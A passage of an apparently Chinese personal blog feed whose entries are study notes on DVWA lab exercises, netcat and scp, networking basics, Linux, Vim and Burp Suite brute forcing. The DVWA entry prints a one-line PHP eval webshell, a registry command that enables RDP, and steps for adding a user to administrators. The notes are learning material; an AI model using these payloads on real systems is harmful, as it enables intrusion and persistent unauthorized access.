        <content type="html"><![CDATA[<p>之前的测试没做完，先做一点。(っ °Д °;)っ</p><h2 id="命令上传漏洞利用"><a href="#命令上传漏洞利用" class="headerlink" title="命令上传漏洞利用"></a>命令上传漏洞利用</h2><p>练习dvwa中的文件上传漏洞，想着把之前的一句话木马拿过来用，发现之前做的时候没留下痕迹，\┑(￣Д ￣)┍于是从网上找一句话木马再测试一下。</p><p>最简单的一句话木马。</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p>之前还有比较复杂的，但当时做的时候什么也没有留下。现在还是的重头再来。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3vqr4.png" alt="Y3vqr4.png"></p><p>上传成功，找菜刀连接，又在电脑上找之前下载过的菜刀。orz，最后找到了中国蚁剑。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3vzPx.png" alt="Y3vzPx.png"></p><p>填入文件上传后的地址和密码，编码设置成GB2312（否则接入终端会出现乱码），</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xpRK.png" alt="Y3xpRK.png"></p><p>连接成功后，查看系统中存在的用户，并创建一个新用户test。</p><p><code>net user 用户名 密码（可选） /add</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xeit.png" alt="Y3xeit.png"></p><p>使用远程连接192.168.1.132，连接被拒绝。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xnRf.png" alt="Y3xnRf.png"></p><p>打开3389端口，还是连接被拒绝。</p><blockquote><p>1）开启3389端口：<br>在cmd内，执行如下命令，即可开启3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p><p>2）关闭3389端口：<br>在cmd内，执行如下命令，即可关闭3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p></blockquote><p>猜测新建的用户没权限。于是想办法把用户添加到系统组。系统组名称不知道查看已存在的系统用户组。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3x8ds.png" alt="Y3x8ds.png"></p><p>得到系统用户组名administrators。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xUzT.png" alt="Y3xUzT.png"></p><p>命令执行成功。运行mstsc。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3xdQU.png" alt="Y3xdQU.png"></p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中的nc命令和scp命令</title>
      <link href="/2020/05/04/linux-3/"/>
      <url>/2020/05/04/linux-3/</url>
      
        <content type="html"><![CDATA[<p>这几个命令平常不怎么用，但是实际用途还是有的。就先记录一下。</p><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><p><strong>lastb命令</strong>用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于<code>/var/log</code>目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><strong>nc命令</strong>是<strong>netcat命令</strong>的简称。</p><ul><li><p>远程拷贝文件</p><p>server1上的文件拷贝到server2中。</p><ul><li><p>server2中运行</p><blockquote><p>netcat -lp 1234 &gt; 123.txt<br>netcat -lp 1234 &gt; 456.txt</p></blockquote></li><li><p>server1中运行</p><blockquote><p>nc -w 1 192.168.1.128 1234 &lt; 123.txt<br>nc -w 1 192.168.1.128 1234 &lt; 456.txt</p></blockquote></li></ul></li></ul><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p><strong>scp命令</strong>用于在Linux下进行远程拷贝文件的命令，和它类似的命令有<a href="http://man.linuxde.net/cp" target="_blank" rel="noopener">cp</a>，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读<a href="http://man.linuxde.net/read" target="_blank" rel="noopener">read</a> only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，<a href="http://man.linuxde.net/rsync" target="_blank" rel="noopener">rsync</a>就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。</p><blockquote><p>scp <a href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/123.txt /scp</p><p>//复制到本机</p><p>scp /scp/456.txt <a href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/</p><p>//上传到目标机</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础笔记</title>
      <link href="/2020/04/19/network/"/>
      <url>/2020/04/19/network/</url>
      
        <content type="html"><![CDATA[<p>在一个风和日丽的下午，看了一篇关于计算机网络的文章，发现自己有些东西也忘的差不多了，就想着顺便复习一下网络基础知识，并记录一下今天做了什么。</p><blockquote><p>保持清醒的头脑，知道自己在做什么，知道自己做过什么。</p></blockquote><p>我这个人还是比较健忘的，有时候两秒前刚做的事转头就忘的一干二净，想起来还挺费劲。于是为了避免自己到时候脑子一片空白的情况，还是把今天干的事情记录一下为好。</p><h2 id="计算机网络基础笔记"><a href="#计算机网络基础笔记" class="headerlink" title="计算机网络基础笔记"></a>计算机网络基础笔记</h2><h3 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h3><p>自下而上依次为：物理层、数据链路层，网络层、传输层、会话层、表示层、应用层。        </p><table><thead><tr><th>七层模型</th><th>简易理解</th><th>设备</th></tr></thead><tbody><tr><td>物理层</td><td>有物理设备</td><td>中继器、集线器</td></tr><tr><td>数据链路层</td><td>存在链路</td><td>网桥、交换机 (帧)</td></tr><tr><td>网络层</td><td>地图寻址</td><td>路由器 (IP数据报)</td></tr><tr><td>传输层</td><td>提供可靠的传输</td><td>网关 （TCP、UDP）</td></tr><tr><td>会话层</td><td>建立连接</td><td></td></tr><tr><td>表示层</td><td>数据转化</td><td></td></tr><tr><td>应用层</td><td>应用间协议</td><td></td></tr></tbody></table><h3 id="私有IP地址"><a href="#私有IP地址" class="headerlink" title="私有IP地址"></a>私有IP地址</h3><p>私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。</p><ul><li>A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255</li><li>B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255</li><li>C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255</li></ul><p>子网掩码简单来说就是划分子网用的。</p><ul><li>如果两个IP地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。</li></ul><blockquote><p>比如一个子网有10台主机，那么对于这个子网需要的IP地址是：</p><p>　　10＋1＋1＋1＝13</p><p>　　<strong>注意：加的第一个**</strong>1<strong><strong>是指这个网络连接时所需的网关地址，接着的两个</strong></strong>1<strong>**分别是指网络地址和广播地址。</strong></p><p>　　因为13小于16（16等于2的4次方），所以主机位为4位。而256－16＝240，所以该子网掩码为255.255.255.240。</p><p>如果一个子网有14台主机，不少人常犯的错误是：依然分配具有16个地址空间的子网，而忘记了给网关分配地址。这样就错误了，因为14＋1＋1＋1＝17，17大于16，所以我们只能分配具有32个地址（32等于2的5次方）空间的子网。这时子网掩码为：255.255.255.224。</p></blockquote><h3 id="ARP-RARP协议"><a href="#ARP-RARP协议" class="headerlink" title="ARP/RARP协议"></a>ARP/RARP协议</h3><p>ARP：地址解析协议（address resolution protocol）是通过IP地址获取到MAC地址。</p><p>RARP：逆地址解析协议，将MAC地址转换为IP地址。</p><h3 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h3><p>RIP协议：最大跳数为15跳，超过15跳会丢弃数据包。</p><p>OSPF协议：开放式最短路径优先，是链路状态路由选择协议。</p><h3 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h3><p>TCP/IP协议毫无疑问是互联网的基础协议，没有它就根本不可能上网，任何和互联网有关的操作都离不开TCP/IP协议。</p><p>IP层接收更底层发来的数据包，并将该数据包传送到更低层。IP数据包是不可靠的传输。</p><p>TCP是面向连接的通信协议，三次握手建立可靠的连接。</p><blockquote><p>使用TCP的协议：FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</p></blockquote><p>UDP是面向无连接的通讯协议，UDP数据包包括源端口号和目的端口号。属于不可靠的传输。</p><blockquote><p>使用UDP协议包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p></blockquote><p>DNS域名解析服务，将URL转换为IP地址。</p><p>NAT网络地址转换，将私有地址转化为合法IP的技术。</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>服务器在网络上为不同用户提供不同内容的信息、资料和文件。可以说服务器就是Internet网络上的资源仓库。</p><h3 id="服务器种类"><a href="#服务器种类" class="headerlink" title="服务器种类"></a>服务器种类</h3><ol><li><p>www服务器</p><p>WWW服务器能够为用户提供网页浏览、论坛访问等等服务。</p></li><li><p>FTP服务器</p><p>FTP服务器是专门为用户提供各种文件(File)的服务器。</p></li><li><p>邮件服务器</p><p>邮件服务器就像邮局一样，可以为用户提供电子邮件的接收存储和发送服务。 </p></li></ol><p>除了以上3种常见的服务器外，还有数据库服务器、代理服务器、域名服务器等。</p><h3 id="RAID技术"><a href="#RAID技术" class="headerlink" title="RAID技术"></a>RAID技术</h3><p>在部署服务器之前，一般要做RAID。</p><ul><li>RAID：（Redundant Array of Inexpensive Disk）廉价冗余磁盘阵列。由于磁盘存取速度跟不上CPU处理速度的发展，从而成为提高服务器I/O能力的一个瓶颈。RAID技术利用磁盘分段、磁盘镜像、数据冗余技术来提高磁盘存取速度，同时提供磁盘数据备份、提高了系统可靠性。</li><li>磁盘分段（Disk Striping）：数据以”段”为单位依次读写多个磁盘，多磁盘相当于同时操作，存取速度极大地提高。</li><li>磁盘镜像（Disk Mirroring）：用一个控制器控制两个磁盘，同时读写相同的数据，数据100%备份。 </li><li>数据冗余技术：数据读写时做校验，校验数据以紧凑格式存于磁盘上，可用于纠错及恢复数据。 </li></ul><p>RAID级别</p><table><thead><tr><th>RAID级别</th><th>描述</th><th>技术</th><th>速度</th><th>容错能力</th></tr></thead><tbody><tr><td>RAID 0</td><td>磁盘分段</td><td>没有校验数据</td><td>磁盘并行I/O，存取速度提高最大</td><td>数据无备份</td></tr><tr><td>RAID 1</td><td>磁盘镜像</td><td>没有校验数据</td><td>读数据速度有提高</td><td>数据100%备份(浪费)</td></tr><tr><td>RAID 2</td><td>磁盘分段+汉明码数据纠错</td><td>/</td><td>没有提高</td><td>允许单个磁盘错</td></tr><tr><td>RAID 3</td><td>磁盘分段+奇偶校验</td><td>专用校验数据盘</td><td>磁盘并行I/O，速度提高较大</td><td>允许单个磁盘错，校验盘除外</td></tr><tr><td>RAID 4</td><td>磁盘分段+奇偶校验</td><td>异步专用校验数据盘</td><td>磁盘并行I/O，速度提高较大</td><td>允许单个磁盘错，校验盘除外</td></tr><tr><td>RAID 5</td><td>磁盘分段+奇偶校验</td><td>校验数据分布存放于多盘</td><td>磁盘并行I/O，速度提高较大，比RAID 0稍慢</td><td>允许单个磁盘错，无论哪个盘</td></tr></tbody></table><p>磁盘系统作好RAID 5后，任一块磁盘出现故障后，系统仍可运行，故障盘上的数据可通过其它盘上的校验数据计算出来（此时速度要慢一些）。如果磁盘系统中有备份盘，则数据自动恢复到备份盘中。如果具备热插拔硬盘，则在开机状态下即可换下故障硬盘，数据将自动恢复到新硬盘上。在这些过程中，系统并没有停止运行。</p><h2 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h2><h3 id="报文"><a href="#报文" class="headerlink" title="报文"></a>报文</h3><p>HTTP1.0/1.1报文由三部分组成：起始行、首部以及可选、包含数据的主体</p><p><strong>其中起始行和首部是由行分隔的ASCII文本</strong></p><p>请求报文的格式：</p><pre><code>&lt;method&gt; &lt;request-url&gt; &lt;version&gt;&lt;headers&gt;&lt;entity-body&gt;</code></pre><p>响应报文的格式：</p><pre><code>&lt;version&gt; &lt;status&gt; &lt;reason-phrase&gt;&lt;headers&gt;&lt;entity-body&gt;</code></pre><h4 id="起始行"><a href="#起始行" class="headerlink" title="起始行"></a>起始行</h4><p>所有的HTTP报文都以一个起始行做为开始</p><p>请求报文：<method> <request-url> <version>   说明要做什么</p><p>响应报文：<version> <status> <reason-phrase>  说明结果怎样</p><p>method，包括GET/POST/DELETE等等</p><p>version，目前绝大多数都是1.0或者1.1</p><p>status，表示做的结果</p><p>reason-phrase，是对状态结果的进一步补充说明</p><h4 id="首部"><a href="#首部" class="headerlink" title="首部"></a>首部</h4><p>HTTP首部字段向请求和响应报文中添加了一些附加信息，是一系列 key-value的列表,比如Content-Type:image/jpeg 表示类型是jpeg图片</p><p>首部的分类包括</p><p>通用首部：在请求和响应中都出现的信息</p><p>请求首部：只在请求报文中出现的信息</p><p>响应首部：只在响应报文中出现的信息</p><p>实体首部：描述主题的长度、内容等的信息</p><p>扩展首部：在HTTP规范中没有定义的其他信息</p><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>HTTP实体是HTTP报文的负荷，是HTTP要传输的数据内容。</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>GET，请求服务器发送某个资源</p><p>POST，向服务器提交数据，有主体。</p><p>HEAD，响应只在首部，不返回具体数据，查看资源是否存在。</p><hr><p>PUT:用于向服务端写入文档</p><p>TRACE:用于跟踪某个请求</p><p>OPTIONS:用于查询服务端支持的方法</p><p>DELETE:用于删除服务端某个资源</p><hr><p>LOCK：锁定某个资源</p><p>COPY：拷贝某个资源</p><p>MOVE：移动某个资源</p><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><p>信息性状态码：100~199</p><p>成功状态码：200~299</p><p>重定向状态码：300~399</p><p>客户端错误状态码：400~499</p><p>服务端错误状态码：500~599</p><h2 id="计算机端口"><a href="#计算机端口" class="headerlink" title="计算机端口"></a>计算机端口</h2><p>在Internet上，按照协议类型分类，端口被分为TCP端口和UDP端口两类，虽然他们都用正整数标识，但这并不会引起歧义，比如TCP的80端口和UDP的80端口，因为数据报在标明端口的同时，还将标明端口的类型。<br>　　从端口的分配来看，端口被分为固定端口和动态端口两大类（一些教程还将极少被用到的高端口划分为第三类：私有端口）：</p><p>固定端口（0－1023）：</p><p>使用集中式管理机制，即服从一个管理机构对端口的指派，这个机构负责发布这些指派。由于这些端口紧绑于一些服务，所以我们会经常扫描这些端口来判断对方 是否开启了这些服务，如TCP的21（ftp），80（http），139（netbios），UDP的7（echo），69（tftp）等等一些大家熟 知的端口；</p><p>动态端口（1024－49151）：</p><p>这些端口并不被固定的捆绑于某一服务，操作系统将这些端口动态的分配给各个进程， 同一进程两次分配有可能分配到不同的端口。不过一些应用程序并不愿意使用操作系统分配的动态端口，他们有其自己的‘商标性’端口，如oicq客户端的 4000端口，木马冰河的7626端口等都是固定而出名的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何学习Linux系统_笔记</title>
      <link href="/2020/04/11/linux-2/"/>
      <url>/2020/04/11/linux-2/</url>
      
        <content type="html"><![CDATA[<p>网上冲浪过程中看到这样一篇文章，觉得有些地方写的挺不错，摘抄过来，留一些我觉得比较有用的东西。这就是一篇关于linux系统的科普文。</p><h2 id="如何学习Linux系统-笔记"><a href="#如何学习Linux系统-笔记" class="headerlink" title="如何学习Linux系统_笔记"></a>如何学习Linux系统_笔记</h2><h3 id="1、Linux初学者入门首选-Redhat系列"><a href="#1、Linux初学者入门首选-Redhat系列" class="headerlink" title="1、Linux初学者入门首选-Redhat系列"></a>1、Linux初学者入门首选-Redhat系列</h3><p>Redhat 是最早发行的个人版Linux。学会Redhat Linux，其他的Linux系统也能很快的学会。</p><p>Redhat 现在主要做服务器版的Linux开发。不再提供免费版本。Redhat应用范围较广，很多Linux系统都是以Redhat系统为基准的。</p><p>Centos 是Redhat的复刻版，提供免费的服务，但也不和Redhat系统完全一样。</p><p>suse Linux 是企业级应用首选系统，具有高可靠性和稳定性。</p><p>Ubuntu 游戏娱乐首选，Ubuntu主打Linux桌面。对硬件支持最好也最全面。</p><h3 id="2、良好的Linux操作习惯"><a href="#2、良好的Linux操作习惯" class="headerlink" title="2、良好的Linux操作习惯"></a>2、良好的Linux操作习惯</h3><p>命令是学习Linux的基础，要学会Linux每个命令的参数含义是必须要做的。看起来容易理解，但要是实际操作，很难去熟练的使用。勤于实践是学好Linux的根本。</p><h4 id="学会独立思考问题，独立解决问题"><a href="#学会独立思考问题，独立解决问题" class="headerlink" title="学会独立思考问题，独立解决问题"></a>学会独立思考问题，独立解决问题</h4><blockquote><p>遇到问题，首先想到的应该是如何自己去解决这个问题，解决方式很多，看书查资料，网络搜索引擎，技术论坛等等，通过这几种方式，90%的问题都能得到解决，通过这种方式一方面锻炼了自己独立解决问题的能力。另一方面技术上也能得到快速提高。<br>如果通过如上方式实在解决不了的话，可以向人询问，得到答案后要考虑为何这么做，然后做笔记记录解决过程。最忌讳的方式是只要遇到问题，就去问人，虽然这样可能会很快解决问题，但是长久下去遇到问题就会依赖别人，技术上也不会进步。</p></blockquote><p>要有主动性的思考，不知道如何实现的，就要去了解他的工作原理。然后根据自己的逻辑来解决遇到的难题。这是我们应该做到的。</p><p>最重要的是自己要能解决问题，而不是依赖别人。</p><h4 id="尝试去看英文文档"><a href="#尝试去看英文文档" class="headerlink" title="尝试去看英文文档"></a>尝试去看英文文档</h4><p>安装一个新的软件时先看README，再看INSTALL，然后看FAQ，最后才动手安装，这样遇到问题就知道为什么。因此，学习一点专业的英语是很有必要的。</p><h4 id="Linux学习路线图"><a href="#Linux学习路线图" class="headerlink" title="Linux学习路线图"></a>Linux学习路线图</h4><p>初级阶段：</p><ol><li>命令是必须要学的，linux常用的命令大概在80个左右，这些常用命令一定要熟练掌握。</li><li>掌握linux软件包的常用安装方法，例如源码安装，rpm方式安装等等。</li><li>学习安装设备驱动程序（比如网卡、显卡驱动） </li><li>熟悉Grub/Lilo引导程序及简单的修复操作。 </li><li>熟悉Linux文件系统和目录结构以及linux基本运行原理。 </li><li>掌握vi，gcc，gdb等常用编辑器，编译器，调试器。 </li><li>理解shell别名、管道、I/O重定向、输入和输出以及shell简单脚本编程。 </li><li>学习Linux环境下的网络基本组建。</li></ol><p>高级阶段:</p><ol><li><p>尝试阅读linux内核源码：</p><p>这需要具有一定的C、C++语言基础，因为C、C++是linux/unix的核心语言，系统代码都是C写的。</p></li><li><p>尝试编译安装和调试自己的linux内核：<br>在阅读源码了解了linux底层的运行原理后，完全可以编译一个适合自己的linux系统来。</p></li><li><p>深入学习shell， perl，cgi等脚本语言：<br>这些脚本语言在linux下非常强大，它们能完成你想做的任何事情，熟练掌握这些语言，可以让你在linux系统下游刃有余，如鱼得水。</p></li><li><p>构建企业级linux高可用集群系统：<br>linux下有很多开源免费的集群软件，利用这些免费的集群软件完全可以构建出与商业unix系统想媲美的集群系统来。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim练级攻略记录</title>
      <link href="/2020/03/09/Vim/"/>
      <url>/2020/03/09/Vim/</url>
      
        <content type="html"><![CDATA[<p>一直想着自己能熟练的使用vim，有时候命令忘记了又要去百度，于是找了一篇详细介绍vim的文档，并进行了总结（把一些我觉得有用的记录下来）。</p><h2 id="Vim攻略"><a href="#Vim攻略" class="headerlink" title="Vim攻略"></a>Vim攻略</h2><h3 id="第一级-基础"><a href="#第一级-基础" class="headerlink" title="第一级 - 基础"></a>第一级 - 基础</h3><h4 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h4><ul><li><code>i</code> → <em>Insert</em> 模式，按 <code>ESC</code> 回到 <em>Normal</em> 模式.</li><li><code>x</code> → 删当前光标所在的一个字符。</li><li><code>:wq</code> → 保存 + 退出 (<code>:w</code> 存盘, <code>:q</code> 退出)</li><li><code>dd</code> → 删除当前行，并把删除的行存到剪贴板里</li><li><code>p</code> → 粘贴剪贴板</li><li><code>: N</code> 到第N行</li></ul><h3 id="第二级-感觉良好"><a href="#第二级-感觉良好" class="headerlink" title="第二级 - 感觉良好"></a>第二级 - 感觉良好</h3><h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><ul><li><code>a</code> → 在光标后插入</li><li><code>o</code> → 在当前行后插入一个新行</li><li><code>O</code> → 在当前行前插入一个新行</li><li><code>cw</code> → 替换从光标所在位置后到一个单词结尾的字符</li></ul><h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><ul><li><code>0</code> → 数字零，到行头</li><li><code>$</code> → 到本行行尾</li></ul><h4 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h4><ul><li><code>P</code> → 粘贴</li><li><code>yy</code> → 拷贝当前行当行于 <code>ddP</code></li></ul><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><ul><li><code>:x</code>， <code>ZZ</code> 或 <code>:wq</code> → 保存并退出 (<code>:x</code> 表示仅在需要时保存，ZZ不需要输入冒号并回车)</li><li><code>:q!</code> → 退出不保存 <code>:qa!</code> 强行退出所有的正在编辑的文件，就算别的文件有更改。</li><li><code>:bn</code> 和 <code>:bp</code> → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。</li></ul><h3 id="第三级-更好，更强，更快"><a href="#第三级-更好，更强，更快" class="headerlink" title="第三级-更好，更强，更快"></a>第三级-更好，更强，更快</h3><h4 id="更好"><a href="#更好" class="headerlink" title="更好"></a>更好</h4><ul><li><code>.</code> → (小数点) 可以重复上一次的命令</li><li>N<command> → 重复某个命令N次</li><li><code>2dd</code>→删除2行</li><li><code>3p</code>→粘贴文本3次</li></ul><h4 id="更强"><a href="#更强" class="headerlink" title="更强"></a>更强</h4><ul><li>N<code>G</code> → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）</li><li><code>gg</code> → 到第一行。（陈皓注：相当于1G，或 :1）</li><li><code>G</code> → 到最后一行。</li><li>按单词移动<ul><li><code>w</code>→到下一个单词的开头</li><li><code>e</code>→到下一个单词的结尾</li></ul></li></ul><pre><code>&gt; 如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（陈皓注：程序变量）&gt; 如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（陈皓注：程序语句）</code></pre><ul><li><code>%</code> : 匹配括号移动，包括 <code>(</code>, <code>{</code>, <code>[</code>. （陈皓注：你需要把光标先移到括号上）</li><li><code>*</code> 和 <code>#</code>:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li></ul><h4 id="更快"><a href="#更快" class="headerlink" title="更快"></a>更快</h4><ul><li>例如 <code>0y$</code> 命令意味着：<ul><li><code>0</code> → 先到行头</li><li><code>y</code> → 从这里开始拷贝</li><li><code>$</code> → 拷贝到本行最后一个字符</li></ul></li><li>还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝：<ul><li><code>d</code> (删除 )</li><li><code>v</code> (可视化的选择)</li><li><code>gU</code> (变大写)</li><li><code>gu</code> (变小写)</li></ul></li></ul><h3 id="第四级-Vim超能力"><a href="#第四级-Vim超能力" class="headerlink" title="第四级 - Vim超能力"></a>第四级 - Vim超能力</h3><ul><li><code>:split</code> → 创建分屏 (<code>:vsplit</code>创建垂直分屏)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite使用记录</title>
      <link href="/2020/03/08/Burp-Suite/"/>
      <url>/2020/03/08/Burp-Suite/</url>
      
        <content type="html"><![CDATA[<p>之前学bp，学到了一点皮毛，知道怎么来爆破密码，但是对具体的操作没有进行实验，这几天闲了，再重新把爆破这部分做了一遍。ヾ(•ω•`)o</p><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><h3 id="Intruder-暴力破解模块"><a href="#Intruder-暴力破解模块" class="headerlink" title="Intruder_暴力破解模块"></a>Intruder_暴力破解模块</h3><p>抓到数据包之后，发送到Intruder。</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqc7x6sukj30yy0c3myo.jpg" alt="发送到爆破模块"></p><p>设置攻击目标和目标端口</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcc9oon9j30yz09edga.jpg" alt="设置攻击目标.png"></p><p>设置变量和攻击模式。</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" alt="攻击类型"></p><h4 id="attack-type-攻击类型介绍"><a href="#attack-type-攻击类型介绍" class="headerlink" title="attack type 攻击类型介绍"></a>attack type 攻击类型介绍</h4><ul><li><p><strong>Sniper - 单个变量使用一个字典的情况。从上到下，单个匹配。</strong>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p></li><li><p><strong>Battering ram – 多个变量使用同一个字典的情况。A变量=B变量，每次两个位置用同样的密码。</strong>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p></li><li><p><strong>Pitchfork - 多个变量使用不同字典的情况。A字典的第一行对应B字典的第一行</strong>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p></li><li><p><strong>Cluster bomb – 交叉爆破，每一种组合都会测试。多变量建议使用这个模式</strong>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p></li></ul><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" alt="1583647566242.png"></p><p>Burp Intruder包含以下几种attack type:</p><blockquote><p>Simple list–简单字典<br>Runtime file–运行文件<br>Custom iterator–自定义迭代器<br>Character substitution–字符替换</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Burp Suite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp Suite </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-渗透测试入门</title>
      <link href="/2020/03/05/DVWA-1/"/>
      <url>/2020/03/05/DVWA-1/</url>
      
        <content type="html"><![CDATA[<p>dvwa是web渗透测试入门训练平台，了解基础的web安全知识，通过搭建这个平台并学习利用平台上的漏洞来提高自己的能力。</p><h2 id="DVWA-渗透测试入门"><a href="#DVWA-渗透测试入门" class="headerlink" title="DVWA-渗透测试入门"></a>DVWA-渗透测试入门</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>暴力破解即用暴力穷举的方式大量尝试性地猜破密码。</p><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>刚开始看到这个题目不知如何下手。只知道要使用暴力破解，我手头也没有字典。然后就从网上随便找了一个字典进行测试。</p><p>首先打开burpsuite抓包。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkp6cjvqj30ne07haa4.jpg"/><p>抓到数据包。send to intruder，我第一次做时，是使用sniper模式进行爆破的。用户名随便输了个admin，只设置了密码变量。成功爆出密码后，又使用cluster bomb模式进行了多变量交叉爆破。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkq3lge8j30o10c6jsl.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjrsh33gj30z10dz0ub.jpg"/><p>成功爆破到用户名和密码。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjszl523j30n80i4gn9.jpg"/><p>暴力破解成功</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegju8ma2kj30nj09a3yo.jpg"/><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>仍然可以爆破成功。爆破时间长了一点。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjupv6b0j30n30i3404.jpg"/><p>查看源代码，发现有sleep(2)的函数。登陆失败会等待2秒。</p><h4 id="high"><a href="#high" class="headerlink" 